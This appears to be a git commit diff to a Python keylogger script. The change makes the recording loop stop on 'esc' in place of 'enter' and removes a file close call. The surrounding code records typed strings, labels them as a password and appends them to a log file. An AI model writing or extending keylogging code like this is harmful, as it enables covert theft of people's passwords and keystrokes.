b573a79d468a98306a530c50b50c5b09e0bf0e3b
Jumanji176 <80910392+Jumanji176@users.noreply.github.com>
2021-07-19 14:27:15 +0300

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -8,9 +8,8 @@ while True:
     with open(path, 'a') as data_file:
         
         # All key presses are recorded as a list into "events" and the record loop stops when the "enter" key is pressed
-        events = keyboard.record('enter')
+        events = keyboard.record('esc')
         password = list(keyboard.get_typed_strings(events))
         
         data_file.write('\n') # New line written before data is written
         data_file.write(password[0])
-        data_file.close()
